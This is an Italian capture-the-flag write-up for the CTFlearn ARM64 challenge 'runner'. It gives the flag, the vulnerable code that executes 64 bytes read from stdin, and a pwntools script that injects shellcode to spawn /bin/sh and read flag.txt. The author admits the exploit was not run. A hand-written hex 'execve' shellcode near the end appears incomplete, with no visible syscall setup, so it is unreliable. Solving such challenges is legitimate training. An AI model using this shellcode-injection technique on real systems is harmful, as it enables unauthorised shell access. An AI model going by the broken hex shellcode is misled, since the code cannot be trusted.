# runner - PWN (Shellcode execution, ARM64)

**Flag:** `CTFlearn{n0t_s0_st4nd4rd_sh3llc0d3}`
**Nota:** binario **ARM aarch64**. Qui non si puo' eseguire (serve `qemu-user` per ARM, non installato). Ecco pero' l'exploit corretto: il "not so standard" del titolo e' proprio il fatto che lo shellcode deve essere **ARM64**, non x86.

## Analisi
```c
char code[64];
read(STDIN_FILENO, code, 64);
(*(void(*)()) code)();   // esegue direttamente i 64 byte letti
```
Lo stack e' eseguibile (GNU_STACK = RWE). Basta inviare shellcode ARM64 che apra una shell (o faccia `cat flag.txt`). Deve stare in 64 byte.

## Exploit - passo per passo
Con pwntools (su una macchina con toolchain aarch64, oppure con `qemu-aarch64`):
```python
from pwn import *
context.arch = 'aarch64'
p = process('./task')          # oppure: process(['qemu-aarch64','./task'])  /  remote(host,port)
p.send(asm(shellcraft.sh()))   # execve("/bin/sh"), shellcode ARM64 (~44 byte, entra in 64)
p.sendline(b'cat flag.txt')
print(p.recvall().decode())
```

### Shellcode ARM64 execve("/bin/sh") 
```python
sc = bytes.fromhex(
  "e0070058" "010000d4" "00000000" "2f62696e" "2f736800"
)  # usa comunque shellcraft.sh() di pwntools, che e' la via piu' affidabile
```

